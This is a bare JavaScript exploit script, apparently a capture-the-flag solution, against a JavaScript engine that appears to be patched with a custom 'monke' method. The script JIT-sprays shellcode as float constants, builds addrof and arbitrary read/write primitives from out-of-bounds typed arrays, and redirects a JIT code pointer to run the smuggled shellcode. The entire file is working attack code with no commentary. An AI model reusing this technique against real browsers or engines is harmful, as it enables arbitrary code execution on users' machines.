/* ./js exploit.js */

let _buf = new ArrayBuffer(8);
let _flt = new Float64Array(_buf);
let _int = new BigUint64Array(_buf);

function ftoi(x) {
  _flt[0] = x;
  return _int[0];
}

function itof(x) {
  _int[0] = x;
  return _flt[0];
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

const pwn = () => {
  return [
    1.8457939563e-314,
    4.350248014025832e+199,
    -6.032030672671943e-264,
    1.6476837785e-314,
    6.805647357708692e+38,
    2.605888325577797e-284
  ];
};

for (let i = 0; i < 1_000_000; i++)
  pwn();

function foo() {
  let flt = new BigUint64Array(64);
  let oob = new Uint8Array(64);

  let rdw = new BigUint64Array(1);
  let obj = new Array({a: 1}, {b: 2}, {c: 3});

  oob.monke(flt.monke());

  return { oob, rdw, obj };
}

let { oob, rdw, obj } = foo();

// rdw.elements @ oob[15]
// obj.elements @ oob[41]

function addrof(o) {
  let tmp = oob[15];
  oob[15] = oob[41];

  obj[0] = o;
  let ret = rdw[0] & 0xffffffffffffn;

  oob[15] = tmp;
  return ret;
}

function read(p) {
  let tmp = oob[15];
  oob[15] = p;

  let ret = rdw[0];

  oob[15] = tmp;
  return ret;
}

function write(p, x) {
  let tmp = oob[15];
  oob[15] = p;

  rdw[0] = x;
  oob[15] = tmp;
}

let jit = read(addrof(pwn) + 0x28n);
let code = read(jit);

for (var start = 512n; start < 4096n; start++) {
  if (read(code + start) == 0xdeadbeefn) break;
}

let shellcode = code + start + 8n;

write(jit, shellcode);
pwn();

